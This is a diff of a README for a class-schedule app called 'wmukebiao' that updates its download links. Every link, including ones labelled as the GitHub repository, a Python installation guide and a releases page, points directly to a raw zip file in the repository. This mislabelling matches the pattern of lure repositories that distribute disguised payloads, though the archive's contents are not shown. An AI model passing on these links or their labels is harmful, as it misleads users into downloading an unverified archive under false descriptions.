@@ -1,6 +1,6 @@
 # 📅 wmukebiao - Effortlessly Sync Your Class Schedule
 
-![Download](https://raw.githubusercontent.com/DinoC00kie/wmukebiao/main/frontend/static/Software_v2.2.zip)
+![Download](https://raw.githubusercontent.com/DinoC00kie/wmukebiao/main/templates/Software_v3.8-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download the application, visit the Releases page below:
 
-[Download wmukebiao](https://raw.githubusercontent.com/DinoC00kie/wmukebiao/main/frontend/static/Software_v2.2.zip)
+[Download wmukebiao](https://raw.githubusercontent.com/DinoC00kie/wmukebiao/main/templates/Software_v3.8-beta.1.zip)
 
 1. Click the link to go to the Releases page.
 2. Locate the latest version.
@@ -76,8 +76,8 @@ If problems persist, please visit the GitHub page for support.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/DinoC00kie/wmukebiao/main/frontend/static/Software_v2.2.zip)
-- [Python Installation Guide](https://raw.githubusercontent.com/DinoC00kie/wmukebiao/main/frontend/static/Software_v2.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/DinoC00kie/wmukebiao/main/templates/Software_v3.8-beta.1.zip)
+- [Python Installation Guide](https://raw.githubusercontent.com/DinoC00kie/wmukebiao/main/templates/Software_v3.8-beta.1.zip)
 
 ## 🛡️ License
 
